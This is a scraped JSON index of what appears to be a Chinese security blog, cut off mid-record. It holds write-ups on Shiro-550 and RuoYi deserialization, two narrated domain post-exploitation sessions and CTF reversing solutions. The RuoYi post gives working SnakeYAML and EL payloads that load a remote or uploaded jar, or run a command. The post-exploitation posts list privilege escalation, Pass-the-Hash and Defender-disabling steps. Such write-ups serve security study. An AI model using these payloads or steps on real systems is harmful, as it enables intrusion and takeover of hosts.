dd788fa06c64b6e68f0e24fd24b2d66565dc5140839871faa1911ba653ff05bd59c5828fee622f93609bd9257e355db6e87465667deaea42a6ab7ecffefb10073a2f066ca29671a913c24d46db2c48198d36fec6c81e0f7e4e063fb069426166ef0e69effc2fd91f51d9664569d34d0ea0fa8d021b707878e9453b3e9e70ee5456bb4052b2ec74c70c88dd306cfde7e8f70dec91449c20529b941e71f7a731e900ab9116f70b0683bd595162f80754596bdf84871caf831a22be52022c1e2e38c65b981b34b45cffbc7b2ce68c54ec24db15afa794432cf9adea4848da93cd40a2b2a5dec6bd3c72627740991c69d82681d7a7612db82ccfe0ddaecc52762bebe1c35dc73590593bef6250a83a1e36123f83d965ed519c2861636ccdf52d541000712a5850b400f1b6de8c65c72cb2d1d1c430e7755f3166eae29c4a616eb2f45833a0accc63137c7e27b05353d08ba9437b33885517b95f829a84e87338f9e457caa8567b92096e1bc196112eef714021c2c596af09c58571b1a567b8bd59dafdfc79d8540a28ac2e5309168a319b6d6de98e943b3fbcfb91910d622f3ce964e46f422a51bd00b9d25c0d0753b6fd0b8daa11b4e82972caf0b7c44a6d724d390a15506f42a250f8e26d762316715c50cf1d31a058b8425812dfc68cd58b01bcfc6cd770e013fec3284be3066697f1f3fa0dda44c369fe6a356bd91ee937c098a801a72b5b17378256b58263ff0bdac455aceadd7ab73d92f5476308e82c57b59bfc95c27fdba423523521ffcb263ae4f0453d3ad9dee04a0c318777c1ac4981c6db8fa4c1ab98f0c840dfda5f41912990ead37e7b541d440fa762ca3190ad573ec3d5e2d40f6ee9767aba21716d989686a47b9b10bec748f89b213c5a17e072b391e51b38bec692471541e8eedf49e8d4dea7cbdb9a0e18b27f27d4526d7d6f47ef76ddc8f71ad4ca3952ed47c15381f302f84870dc6ef37eb80f73b8f3da42330e80dae7518b041a95c53d647ae60fc66bea2e0fb73d33b34cc2b33b92a401467d7ec58012df0b0676a3167bab4c6b2a39ab74e52ae8af64f9a410d76f1104fc637d35a0180fad235bcdcff6bc011020c06f10139d396b7c7a4bbdf469727bbd8622d19464bb7d23b0f297e3ee9a3ca27faf0b827af335986bcc6d7c4fb2fce184a0d94fdf680e7378fe9401ba5f81801040a8eaf87258f7e34b0151d2862c77d08309e9a94f87cd53e7027a336bf39d12e9cd06b1362ba4914d8b91c3360f6ac953bde3bf8e672e330286780a9d84c820411147bb78a2f53cfc7c0d508233413af5cb2e90ebaa6b6d4102a5707d3af181d8ba97d5338c711654b38a319a3d65357b9074c7d25fe6bc3375c8df27438d862bea012b2dc1367c471c1c4fd4b56907b3584a5386a41b0b3c8589508ada859e8bcb780a8e2290bdfc29093a5a7f67f51c26cb84ed5b313000263f595b32d2dc6057433301bd9f0303824e8d2a4a29de2232fe28c10aaadd10ff4eb6556a2e8c78a803c90ed233294b01cb153773589f5d1134fd543d101834cc203b4dfd895e212f90c34961ce86aa077e73b968cbadaf1e8e9023f2c7ab0eac9ad5da1ffaa4ae3b37d2398d912ff975caf8a455a3d2fa4f07a7632b91a957011ed9d6ca0c8f1edd33889c06 您好, 这里需要密码.","link":"/2021/07/09/基于ASP.NET_MVC的easycms的easy代码审计/"},{"title":"没什么好分析的Shiro-550","text":"前言陆陆续续分析了几个Java的安全漏洞，接下来轮到shiro的了。这里分析的是Shiro-550，硬编码rememberMe密钥造成的反序列化漏洞。分析起来比想象着的简单。 环境搭建Shiro-550是使用shiro1.2.4及以下的默认密钥导致的反序列化漏洞，环境的代码我是用的github上一个大佬写的，使用的是Maven包管理，不用怎么搭，自动下载依赖直接运行即可。 漏洞调试根据网上大部分的复现文章，使用ysoserial生成CommonsBeanutils1反序列化链的payload，并使用上面shiro漏洞环境项目的GenPayload类加密一下payload，生成shiro可识别的rememberMe内容。 然后依旧是在Runtime的exec方法下断点，Cookie中设置rememberMe并发送。调用栈挺长的，但跟rememberMe有关的是从AbstractRememberMeManager开始这段。 跟进到AbstractRememberMeManager的getRememberedPrincipals方法。看到bytes变量的内容为加密后的序列化链，跟进getRememberedSerializedIdentity方法看看是如何获取rememberMe内容的。 getRememberedSerializedIdentity方法在AbstractRememberMeManager类中是抽象方法，具体的实现代码要去到AbstractRememberMeManager的子类CookieRememberMeManager中看。整体就是从Cookie中获取rememberMe内容，并返回base64解码的内容。rememberMe的内容是通过this.getCookie()获取当前的cookie对象，而cookie初始化时是用rememberMe这个名称的，获取到的内容相应的也该名称的值。 1234567891011121314151617181920212223242526protected byte[] getRememberedSerializedIdentity(SubjectContext subjectContext) { if (!WebUtils.isHttp(subjectContext)) { ... return null; } else { WebSubjectContext wsc = (WebSubjectContext)subjectContext; if (this.isIdentityRemoved(wsc)) { return null; } else { HttpServletRequest request = WebUtils.getHttpRequest(wsc); HttpServletResponse response = WebUtils.getHttpResponse(wsc); String base64 = this.getCookie().readValue(request, response); if (\"deleteMe\".equals(base64)) { return null; } else if (base64 != null) { base64 = this.ensurePadding(base64); ... byte[] decoded = Base64.decode(base64); ... return decoded; } else { return null; } } }} 获取到字节数组为非空的话会继续调用convertBytesToPrincipals方法，在convertBytesToPrincipals方法中先调用decrypt方法对rememberMe进行解密。shiro使用的是AES加密，按理说还具有初始化向量iv，但解密时候的iv是从rememberMe的开头获取的，所以不影响payload的构造。 1234567891011121314151617181920public ByteSource decrypt(byte[] ciphertext, byte[] key) throws CryptoException { byte[] encrypted = ciphertext; byte[] iv = null; if (this.isGenerateInitializationVectors(false)) { try { int ivSize = this.getInitializationVectorSize(); int ivByteSize = ivSize / 8; iv = new byte[ivByteSize]; System.arraycopy(ciphertext, 0, iv, 0, ivByteSize); int encryptedSize = ciphertext.length - ivByteSize; encrypted = new byte[encryptedSize]; System.arraycopy(ciphertext, ivByteSize, encrypted, 0, encryptedSize); } catch (Exception var8) { String msg = \"Unable to correctly extract the Initialization Vector or ciphertext.\"; throw new CryptoException(msg, var8); } } return this.decrypt(encrypted, key, iv);} 接着是对解密后的内容进行反序列化，最终调用方的是DefaultSerializer类的deserialize方法。这里实例化ObjectInputStream类是用他的子类ClassResolvingObjectInputStream是实现的。 ClassResolvingObjectInputStream的resolveClass方法是通过forName方法返回Class实例的，但forName不支持数组类型的Class，所以反序列化的利用链没使用CommonsCollections的，而是用了CommonsBeanutils1。因为事先看了别的师傅复现的文章，所以没有踩这个坑。具体的forName原理在@zsx师傅的文章里有详尽的分析。除此之外，后面的反序列化就与普通的反序列化无异。 后记CommonsBeanutils1里的TemplatesImpl在上回Java反序列化的文章里没有学到，好像fastjson不出网的payload是有用到这个的，后续还还要补充学习。冲冲冲 参考https://www.cnblogs.com/loong-hon/p/10619616.html https://p2hm1n.com/2020/12/03/Shiro550-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/ https://www.mi1k7ea.com/2020/10/03/%E6%B5%85%E6%9E%90Shiro-rememberMe%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88Shiro550%EF%BC%89/#%E9%83%A8%E5%88%86Gadget%E6%89%93%E5%A4%B1%E8%B4%A5%E7%9A%84%E5%9D%91 http://www.lmxspace.com/2019/10/17/Shiro-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AE%B0%E5%BD%95/#4-%E4%BF%AE%E5%A4%8D%E6%96%B9%E5%BC%8F https://blog.zsxsoft.com/post/35","link":"/2021/09/14/没什么好分析的Shiro-550/"},{"title":"用不可描述的软件做HTB的前置代理","text":"前言​前段时间打HTB，一直受到速度慢的困扰，有时等待一些静态资源加载都要好久。由于一些众所周知的原因，而且HTB提供的代理是OpenVpn，更是被重点关注，于是摸索出来给HTB的OpenVpn加个前置代理的方法，可以加快点速度。 准备工作 不可描述软件酸酸乳和账号一个（我用的酸酸乳，用V2什么的应该也是可以的吧） 右键酸酸乳的运行图标，点击端口设置。像下图一样，添加一个端口设置。开关打开、类型选端口转发，目标地址用的HTB节点的域名，按实际情况填，本地端口随意。 修改配置文件按照官网上的指引修改协议为tcp（酸酸乳默认只支持tcp）。 修改udp协议为tcp、修改remote的端口为端口转发的本地监听端口、服务器地址改为端口转发监听的网卡ip地址、修改&lt;tls-auth&gt;标签为&lt;tls-crypt&gt;。 修改好并保存，启动openvpn应该就能正常运行了，虽然还是很慢，但静态文件至少还能加载，还是充钱才能变得更强啊。","link":"/2020/10/05/用不可描述的软件做HTB的前置代理/"},{"title":"第二次梦里的后渗透","text":"前言继上次做了一个后渗透的梦之后，最近又做了一个同样是后渗透的梦，后面就是都是一些基础操作、没什么干货的水文，在梦里还是这么菜。。。呜~呜~呜~ 信息收集先收集域内信息，存在域，域控和域管理员各两个。 123net time /domainnet group \"domain controllers\" /domainnet group \"domain admins\" /domain 在收集下网络、补丁和权限的信息。 123ipconfig /allsysteminfowhoami /priv 刚好其中一台域控主机就是当前这台机子，补丁打得比较勤，又是开启了SeImpersonateProvilege，Potato系列提权即可。 提取查看进程发现了WinDefend，找了个免杀的BadPotato才提了权。 1tasklist /svc | findstr WinDefend 用BadPotato运行了CS的免杀后门上了线，顺便派生到了msf里。mimikatz读了一波密码，由于系统是Windows2012，所以没有读到明文密码。 接着又用Lazagne.exe读了一波密码，但是除了NTLM之外并没有读到其他的密码。 横向移动虽然做了静态免杀，但是微软的动态查杀挺强的，对外扫描不一会就给WinDefend杀了，给横向移动造成了不少困扰。但不会拦截添加用户和添加用户到Administrators组，而且上面有开了远程桌面，可以直接远程桌面连上去，把WinDefend给鲨了。 后面常规的创建用户加入到Administrators组，CS开启socks代理，但连接远程桌面时候遇到NLA认证问题，查询到freerdp支持NLA，用freerdp解决。 虽然远程桌面进了去，但是WinDefend通常只有启动这个服务的用户才能停止，一般是system用户，奇怪的是用BadPotato执行停止服务的命令还是没法关闭，好在在superuser上找到了个关闭WinDefend的方法。 打开gpedit.msc，切换到Computer Configuration &gt; Administrative Templates &gt; Windows Components &gt; Windows Defender，Turn off Windows Defender设置为Enable。 虽然是没抓到明文密码，但是有NTLM，可用利用Pass The Hash横向移动。由于CS的横向移动是直接传后门的，后面知道域内主机全都有杀软，打完之后全都没上线。 所以上传了个Invoke-TheHash来PTH，大部分主机都能执行命令。 用powershell下载CS的免杀后门并执行，成功让域内主机都上了线。 后续的横向移动在上线的主机上收集到一堆txt和web.config里的密码，对1433、ssh和RDP等服务进行爆破，可惜并没有爆破得到。扫了一遍内网web服务，都是些网络设备，还有一个开源的后台，弱口令进了其中一个，但是没什么收货。 后记总结下这次的渗透流程： getshell-&gt;域信息收集-&gt;提权-&gt;获取NTLM-&gt;关闭WinDefend-&gt;PTH横移动","link":"/2020/09/11/第二次梦里的后渗透/"},{"title":"若依反序列漏洞复现及其修复绕过","text":"前言学完了Java反序列化，在CNVD上找了个有Java反序列化漏洞的系统练练手，叫若依后台管理系统，在github上的star数也不少。我是挺喜欢这个名字的，你若不离不弃、我必生死相依，这个寓意可是作者的官方解读，不是我瞎编的。😆 信息收集主要是看看有没有代码审计的文章，搜了下发现有一篇简单审计这个反序列化漏洞的文章，在官网上还十分良心的给出了历史漏洞。在历史漏洞里给出了Poc和修复方案。 可以初步得知漏洞出现在定时任务的SysJobController控制器里，三个POC的前两个是JNDI注入，后一个是yaml反序列化。 漏洞复现漏洞复现这里使用yaml反序列化的payload来复现。在github上下载yaml-payload并编译打包成jar包，并使用python的SimpleHTTPServer模块起一个HTTP服务用来下载恶意jar包。然后，在后台系统监控的定时任务里加上以下一条任务。 1org.yaml.snakeyaml.Yaml.load(&apos;!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [&quot;http://127.0.0.1:8000/yaml-payload.jar&quot;]]]]&apos;) 然后，IDEA里在Runtime的exec方法下个断点，并在相应定时任务的更多操作里执行一次任务。在调用栈里可看到，项目里的方法调用有四个，其他两块的调用栈分别是quartz任务调度框架和snakeyaml的栈。 跟进AbstractQuartzJob的execute方法，这个方法是由quartz任务调度框架调用的，由quartz的文档可知每个实现Job接口的类为一个任务，这个类还需重写execute方法来实现任务的执行内容。在这个execute方法里，它实例化了一个SysJob类，并调用了doExecute方法。调用的doExecute方法是子类QuartzDisallowConcurrentExecution，功能只是再继续调用JobInvokeUtil的invokeMethod静态方法。 继续跟进到invokeMethod方法，才有一些实质性的逻辑代码。开头调用目标、类名、方法名和方法参数。 123456789101112131415161718public static void invokeMethod(SysJob sysJob) throws Exception{ String invokeTarget = sysJob.getInvokeTarget(); String beanName = getBeanName(invokeTarget); String methodName = getMethodName(invokeTarget); List&lt;Object[]&gt; methodParams = getMethodParams(invokeTarget); if (!isValidClassName(beanName)) { Object bean = SpringUtils.getBean(beanName); invokeMethod(bean, methodName, methodParams); } else { Object bean = Class.forName(beanName).newInstance(); invokeMethod(bean, methodName, methodParams); }} 需要注意的是获取方法参数这里，只能获取String、boolen、long、double和int类型的参数。 1234567891011121314151617181920212223242526272829303132public static List&lt;Object[]&gt; getMethodParams(String invokeTarget){ String methodStr = StringUtils.substringBetween(invokeTarget, \"(\", \")\"); if (StringUtils.isEmpty(methodStr)) { return null; } String[] methodParams = methodStr.split(\",\"); List&lt;Object[]&gt; classs = new LinkedList&lt;&gt;(); for (int i = 0; i &lt; methodParams.length; i++) { String str = StringUtils.trimToEmpty(methodParams[i]); // String字符串类型，包含' if (StringUtils.contains(str, \"'\")) { classs.add(new Object[] { StringUtils.replace(str, \"'\", \"\"), String.class }); } // boolean布尔类型，等于true或者false else if (StringUtils.equals(str, \"true\") || StringUtils.equalsIgnoreCase(str, \"false\")) ... // long长整形，包含L else if (StringUtils.containsIgnoreCase(str, \"L\")) ... // double浮点类型，包含D else if (StringUtils.containsIgnoreCase(str, \"D\")) ... // 其他类型归类为整形 else ... } return classs;} 后续正常类名会进入else代码体，通过newInstance方法获得传入类名的无参构造方法实例化的对象，然后使用对象、方法名和方法参数调用另一个重载的invokeMethod方法。这个重载的invokeMethod方法就是实现反射调用方法的功能，这里就是不细说了。至于POC中JNDI注入，上一篇文章有分析，这里也不细说了，而yaml怎么实现的反序列化，本文也不展开，在后续的文章中再仔细分析。 通过以上的调用栈的分析，可得出以下构造若依反序列化漏洞payload的条件： 入口类只可进行一次反射调用 入口类需可被实例化，并具有默认的无参构造方法 调用的类方法需为无参或参数为String、boolen、long、double和int几种类型 过滤不严回到官网，作者给出的修复方案是过滤rmi、ldap、http字符串，对应的是作者给出的三个POC。那还有其他协议可以实现反序列化吗？答案是肯定的， 虽然官方文档好像没有给出URL类支持的协议，但可以使用以下验证支持那种协议。 12345678910111213141516public static void main(String[] args) { String host = \"www.baidu.com\"; String file = \"/index.html\"; String[] schames = {\"http\", \"https\", \"ftp\", \"mailto\", \"telnet\", \"file\", \"ldap\", \"gopher\", \"jdbc\", \"rmi\", \"jndi\", \"jar\", \"doc\", \"netdoc\", \"nfs\", \"verbatim\", \"finger\", \"daytime\", \"systemresource\", \"webService\", \"redis\", \"zookeeper\", \"rest\", \"thrift\", \"dubbo\"}; for (int i = 0; i &lt; schames.length; i++) { try { URL url = new URL(schames[i], host, file); System.out.println(\"滋瓷 \" + schames[i] + \" 协议\"); } catch (MalformedURLException e) { System.out.println(\"不滋瓷 \" + schames[i] + \" 协议\"); } }} 在测试结果中一眼就能看到file协议和ftp协议，还有个jar协议也是可以使用的，但还是需要借助其他协议才能下载jar包，就没必要多此一举了。 ftp协议的漏洞利用和http协议的其实差不多，把POC中的协议改一改，ftp服务可以使用python的pyftpdlib模块搭一个。 file协议的利用需要把jar包上传到网站上，通知公告模块的编辑器可以上传文件，虽然有文件后缀的白名单过滤，但并不影响URL类加载jar包。不过上传文件返回的路径并不是网站上物理路径，在spring的配置文件application.yml中可以看到windows的默认路径为D:/ruoyi/uploadPath，linux的默认路径为/home/ruoyi/uploadPath。 所以物理路径是D:/ruoyi/uploadPath/upload/2021/09/03/124841a8-6ae4-4888-ba7b-d7ac786cdd6f.txt，最后的payload如下。 1org.yaml.snakeyaml.Yaml.load(&apos;!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [&quot;file:/D:/ruoyi/uploadPath/upload/2021/09/03/124841a8-6ae4-4888-ba7b-d7ac786cdd6f.txt&quot;]]]]&apos;) 一些其他尝试除了过滤不严，还想到了两种构造payload的方法，分别为从依赖包和项目中寻找合适的类和方法。由于系统框架是Spring的，一开始想到的是用SpEL表达式来实现命令执行，但是后面试了下才知道parseExpression方法生成表达式对象后，这个对象还得调用getValue方法才会解析这个表达式。后面陆陆续续看了些质料，发现EL表达式似乎符合这个系统的场景。简单的介绍下EL表达式，他是一种可在JSP和JSPX中使用的语言，可在脚本中获取参数、执行运算、获取对象和调用函数等。 在Java代码中可以使用ELProcessor对象的eval解析EL表达式，经过简单构造可得出payload如下： 1javax.el.ELProcessor.eval(&apos;&quot;&quot;.getClass().forName(&quot;javax.script.ScriptEngineManager&quot;).newInstance().getEngineByName(&quot;JavaScript&quot;).eval(&quot;new java.lang.ProcessBuilder[\\&apos;(java.lang.String[])\\&apos;]([\\&apos;cmd\\&apos;,\\&apos;/c\\&apos;,\\&apos;calc\\&apos;]).start()&quot;)&apos;) 然而一跑起来就抛出了ELException异常，调试跟到反射调用的地方发现EL表达式只剩下&quot;&quot;.getClass(。 最后回去找，大意了。在StringUtils工具类的substringBetween方法，也就是他获取参数的方法中发现它匹配的右括号是传入payload中的第一个，也就是payload中调用的方法不能出现左括号，否则无法获取到所有的参数。 除了依赖包中的类，还找了一圈项目中的类，发现一个yaml的工具类YamlUtil的loadYaml方法可能合适，于是又简单的构造了个payload： 1com.ruoyi.common.utils.YamlUtil.loadYaml(&apos;D:/ruoyi/uploadPath/upload/2021/09/03/124841a8-6ae4-4888-ba7b-d7ac786cdd6f.txt&apos;) 这次则是抛出了FileNotFoundException，因为getResourceAsStream方法无法获取ClassPath外的文件，实在是学艺不精。 后续在项目中还发现了另一个可利用的点，FileUtils工具类的deleteFile方法可以实现任意文件删除，但本文的目标是getshell，而且利用方法也很简单，这里就不再具述。 修复建议借着漏洞条例的颁布，这里献上本人的修复建议。其实在我上一个审计的系统中也是有定时任务功能的，也是通过反射的方式调用任务的实现代码，但是用户只能传入实现这个方法的类名，系统实例化这个类并调用特定的方法。 在这个系统中当然可以使用黑白名单的方式对可实例化的类进行过滤，但这样似乎修复得不彻底。如果使用调用特定方法的方式执行任务，只需设置一个比较特殊的方法名，这个漏洞就很难利用起来了，实际上这个系统用到的quartz任务调度框架就是使用类似的方式，作为调度任务的类续实现quartz的Job接口，并重写execute方法。 当然，以上只是个人对这个漏洞修复的小小看法，仅供参考。 后记本来想找到更高大上的payload，最后还只是找到过滤不严的问题，总的来说还是学艺不精。不过了解到各种表达式还是颇有收获，最后各位师傅若想到其他payload，望不吝赐教。 参考https://www.cnblogs.com/r00tuser/p/14693462.html https://doc.ruoyi.vip/ruoyi/document/kslj.html#%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E https://blog.csdn.net/weixin_41725792/article/details/109818161 https://zhuanlan.zhihu.com/p/183902092","link":"/2021/09/04/若依反序列漏洞复现及其修复绕过/"},{"title":"记一次梦里的后渗透","text":"前言前几天晚上做了一个梦，梦里做了一次后渗透，梦到我拿下域控，今天觉得应该记录下来。 本文纯属虚构，如有雷同纯属巧合。 信息收集起手一个webshell，运气比较好，tasklist没有杀软，上传一个cs后门方便执行命令。 先看看用户和补丁情况，发现发现是个低权限用户nt authority\\network service，Windows2008R2补丁也打得挺勤快的。 12whoamiwmic qfe get Caption,Description,HotFixID,InstalledOn ipconfig看到存在两张内网网卡。 查找域控，定位到两台。 12net group \"domain controllers\" /domainping XXX 配置文件、txt之类的文件都收集了一遍，没找到敏感信息。 提权虽然补丁打得挺勤快的，但是用twitter大佬的提权检测脚本，用自带命令就是whoami /priv，发现一处特权滥用：SeImpersonatePrivilege。根据三好学生师傅的文章得知可用JuicePotato提权。 用多汁土豆运行我们的后门，过会就能在sc里看见上线了一台system权限的机器。 1JuicyPotato -l 1337 -p \\path\\to\\cs.exe -t * 又是运气爆棚的时候，查到本机保存了域控密码，而且是win2008，用mimikatz读一波明文密码。 横向移动既然有了域名管理员密码，就可以用msf的smb_login和psexec进行横向移动，但我这里用cs的psexec，能直接上线主机。 右键session点击net view获取target，在target view选中所有target，右键login->psexec，选中读到的明文密码、选中一个listener、选中一个session，开扫！ 过了半个小时，存活的机子几乎都上了线。 再转到msf，用MS17-010扫扫。发现都内网补丁都整挺好的，一个都没扫到。内网还有几台linux的机子，但是不想继续搞了，擦擦屁股，报告给厂商。（跑 后记如梦初醒，原来我并没有搞什么后渗透，也没拿什么域控，我还是这样的菜，还是无业游民一个，一切都是梦。 过几天又有ctf打了，得重新拿起pwn，做个pwn弟弟了。","link":"/2020/08/10/记一次梦里的后渗透/"},{"title":"[逆向学习笔记]上海全国大学生网络安全邀请赛-pluzz","text":"0x00前言 这回上海大学生网络安全邀请赛就看了这题，实在是没空。不过这次我作为跑龙套的re手思路最清晰的一回了，值得记录下来。 0x01思路作为汇编基础不扎实的跑龙套re手，拿到题目当然是仍经IDA来F5一波。 main函数的逻辑很简单，if判断为真就在sub_401BA0输出flag。通过OD动调得知v11就是通过输入的v9作为种子什么的，经过sub_401BA0函数获得uuid。 if里第一个函数简单的判断输入长度是否为16位，然后是一个while循环，我一开始navie的认为只能输入a-f的字符，后来才发现输入1-9的时候类型转无符号型，结果也会比&amp;大，以后遇到类型转换一点要注意了。 第二个函数没看懂是什么操作，但谷歌了一下%02X格式化输出位两位16的意思，动调的结果也确实如此。值得注意的是sub_401B60的两参数是传引用进去的，在执行完这个函数之后第一个参数的值发生了改变，所以一个函数除了看返回值外还要看它的参数是否为指针或者引用。太菜了现在才领悟到这个道理。 第三个函数IDA的伪代码也没看懂是什么操作，好在这个函数在这之前与输入的字符串关。第一个参数为取指针，直接动调一下看结果，出来了一串好像是int型的东西，后一个函数会用到先dump下来。 第四个函数这回看懂了，就是将转换后的16进制与上一个函数的结果的第i位和前i位的和进行异或，先把要异或的数dump下来备用。返回值恒为真，先放一边。 第五个函数尤为关键，跟第一个函数一样决定了能不能夺得flag。传入8个字节异或后的结果，每字节不能打大于9且要满足7个判断语句。这里按照它的逻辑把八位数爆出来就行了，但是一开始用python写的脚本一堆问题，整得我在比赛结束前没做出来。最后用c++写下就搞出来了。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128#include&lt;iostream&gt;#include&lt;string&gt;#include&lt;ios&gt;using namespace std;long long int dword_40F020 = 0x8A;long long int dword_40F024 = 0x01A1;long long int dword_40F028 = 0x012A;long long int dword_40F02C = 0x0269;long long int dword_40F030 = 0x0209;long long int dword_40F034 = 0x68;long long int dword_40F038 = 0x039F;long long int dword_40F03C = 0x02C8;long long int dword_40F040 = 0x00FF;int test(int v);void flag(int v);int main(){ int v = 0; int i; for (i = 10000000; i &lt;= 99999999; ++i) { int j = i; while (j != 0) { if (test(j % 10) == 1) { cout &lt;&lt; i &lt;&lt; endl; flag(i); return 0; } j /= 10; } dword_40F020 = 0x8A; dword_40F024 = 0x01A1; dword_40F028 = 0x012A; dword_40F02C = 0x0269; dword_40F030 = 0x0209; dword_40F034 = 0x68; dword_40F038 = 0x039F; dword_40F03C = 0x02C8; dword_40F040 = 0x00FF; } return 0;}int test(int v){ int result = 0; switch (v) { case 0: dword_40F028 &amp;= dword_40F038; dword_40F02C *= dword_40F028; goto LABEL_4; case 1: if (!dword_40F02C) goto LABEL_6; dword_40F028 /= dword_40F02C; dword_40F024 += dword_40F034; goto LABEL_4; case 2: dword_40F030 ^= dword_40F034; dword_40F03C += dword_40F020; goto LABEL_4; case 3: dword_40F03C -= dword_40F030; dword_40F030 &amp;= dword_40F024; goto LABEL_4; case 4: dword_40F034 *= dword_40F020; dword_40F02C -= dword_40F038; goto LABEL_4; case 5: dword_40F020 ^= dword_40F02C; dword_40F038 -= dword_40F03C; goto LABEL_4; case 6: if (!dword_40F03C) goto LABEL_6; dword_40F034 |= dword_40F024 / dword_40F03C; dword_40F024 /= dword_40F03C; goto LABEL_4; case 7: dword_40F038 += dword_40F028; dword_40F034 |= dword_40F024; goto LABEL_4; case 8: dword_40F020 *= dword_40F02C; dword_40F030 -= dword_40F03C; goto LABEL_4; case 9: dword_40F028 += dword_40F034; dword_40F02C ^= dword_40F030; LABEL_4: result = ((dword_40F038 == 231) + (dword_40F034 == 14456)+ (dword_40F030 == 14961)+ (dword_40F02C == -13264)+ (dword_40F028 == 16)+ (dword_40F024 == 104)+ (dword_40F020 == -951) == 7); if (dword_40F03C != -239) goto LABEL_6; break; default: LABEL_6: return 0; break; } return result;}void flag(int v){ int a[] = { 0x7C,0xAB,0x2D,0x91,0x2F,0x98,0xED,0xA9 }; int j = 0; while (v) { for (int i = 0; i &lt;= 256; ++i) { if (v % 10 == (i ^ a[j])) { printf(\"%02x\", i); break; } } v /= 10; j += 1; }} 运行结果： 270594167aaa29982a98eaab 输入到题目文件中： Plz solve the puzzle: 7aaa29982a98eaabCongrats!flag{5cb92582-66a8-e5b7-d3bf-3b99df8ac7f0} 0X02总结 应当注意类型装换，以及转换后的字节大小 除了函数的返回值，还可以从参数的引用或指针获取结果 可以通过动态调试函数的结果得知函数的功能","link":"/2019/10/26/逆向学习笔记-上海全国大学生网络安全邀请赛-pluzz/"},{"title":"[逆向学习笔记]桂林电子科技大学“深信服杯”","text":"0x0number_game跟flag直接相关的就是这个函数。 1234567891011121314151617181920212223__int64 sub_400917(){ unsigned int v1; // [rsp+0h] [rbp-10h] signed int i; // [rsp+4h] [rbp-Ch] signed int j; // [rsp+8h] [rbp-8h] int k; // [rsp+Ch] [rbp-4h] v1 = 1; for ( i = 0; i &lt;= 4; ++i ) { for ( j = 0; j &lt;= 4; ++j ) { for ( k = j + 1; k &lt;= 4; ++k ) { if ( *(&amp;unk_601060 + 5 * i + j) == *(&amp;unk_601060 + 5 * i + k) ) v1 = 0; if ( *(&amp;unk_601060 + 5 * j + i) == *(&amp;unk_601060 + 5 * k + i) ) v1 = 0; } } } return v1;} 分析了一下，题目的要求就是补全一个硬编码在内存里的5x5矩阵，它的横竖不能有相同的数字。在根据前面只能输入0~5的数字，手动一下，很容易还原了矩阵。 得到还原出来的字符串，但这是通了前两个函数偏移的出来的矩阵。 123456789101112131415161718_QWORD *__fastcall sub_400758(__int64 cin, int offset, int a3){ _QWORD *v4; // rax _QWORD *v5; // ST28_8 int str_long; // [rsp+0h] [rbp-30h] char v7; // [rsp+1Fh] [rbp-11h] str_long = a3; v7 = *(offset + cin); if ( v7 == 32 || v7 == 10 || offset &gt;= a3 ) return 0LL; v4 = malloc(0x18uLL); v5 = v4; *v4 = v7; v4[1] = sub_400758(cin, 2 * offset + 1, str_long); v5[2] = sub_400758(cin, 2 * (offset + 1), str_long); return v5;} 12345678910111213__int64 __fastcall sub_400807(__int64 a1, __int64 a2){ __int64 result; // rax result = a1; if ( a1 ) { sub_400807(*(a1 + 8), a2); *(a2 + dword_601080++) = *a1; result = sub_400807(*(a1 + 16), a2); } return result;} 看来出题人很喜欢递归啊！！！这递归看得眼花缭乱。 庆幸的是偏移与输入内容无关。输入0123456789，再patch一下ZF，就能得出原字符串和偏移后的字符串。 整个python脚本跑一跑即可得到flag。 12345678910ch = '7381940526'code = '0421421430'flag = ['','','','','','','','','','']for i in xrange(10): flag[ord(ch[i])-ord('0')]=code[i]print 'flag{'+''.join(flag)+'}'#flag{1134240024}","link":"/2019/05/23/逆向学习笔记-桂林电子科技大学“深信服杯”/"}],"tags":[{"name":"UAF","slug":"UAF","link":"/tags/UAF/"},{"name":"StackOverflow","slug":"StackOverflow","link":"/tags/StackOverflow/"},{"name":"SSTI","slug":"SSTI","link":"/tags/SSTI/"},{"name":"machineKey","slug":"machineKey","link":"/tags/machineKey/"},{"name":"XSS","slug":"XSS","link":"/tags/XSS/"},{"name":"SQL","slug":"SQL","link":"/tags/SQL/"},{"name":"update-motd","slug":"update-motd","link":"/tags/update-motd/"},{"name":"模板注入","slug":"模板注入","link":"/tags/模板注入/"},{"name":"HeapOverflow","slug":"HeapOverflow","link":"/tags/HeapOverflow/"},{"name":"IO_file","slug":"IO-file","link":"/tags/IO-file/"},{"name":"ORW","slug":"ORW","link":"/tags/ORW/"},{"name":"SUID","slug":"SUID","link":"/tags/SUID/"},{"name":"hackthebox","slug":"hackthebox","link":"/tags/hackthebox/"},{"name":"反序列化","slug":"反序列化","link":"/tags/反序列化/"},{"name":"JVM","slug":"JVM","link":"/tags/JVM/"},{"name":"HotSpot","slug":"HotSpot","link":"/tags/HotSpot/"},{"name":"shellcode","slug":"shellcode","link":"/tags/shellcode/"},{"name":"RMI","slug":"RMI","link":"/tags/RMI/"},{"name":"内存马","slug":"内存马","link":"/tags/内存马/"},{"name":"CAP","slug":"CAP","link":"/tags/CAP/"},{"name":"mprotect","slug":"mprotect","link":"/tags/mprotect/"},{"name":"ROP","slug":"ROP","link":"/tags/ROP/"},{"name":"NOPASSWD","slug":"NOPASSWD","link":"/tags/NOPASSWD/"},{"name":"脏牛","slug":"脏牛","link":"/tags/脏牛/"},{"name":"域","slug":"域","link":"/tags/域/"},{"name":"tomcat","slug":"tomcat","link":"/tags/tomcat/"},{"name":"Spring","slug":"Spring","link":"/tags/Spring/"},{"name":"ICMP","slug":"ICMP","link":"/tags/ICMP/"},{"name":"log4j","slug":"log4j","link":"/tags/log4j/"},{"name":"struts2","slug":"struts2","link":"/tags/struts2/"},{"name":"JNDI","slug":"JNDI","link":"/tags/JNDI/"}],"categories":[{"name":"PWN","slug":"PWN","link":"/categories/PWN/"},{"name":"CTF","slug":"CTF","link":"/categories/CTF/"},{"name":"靶机","slug":"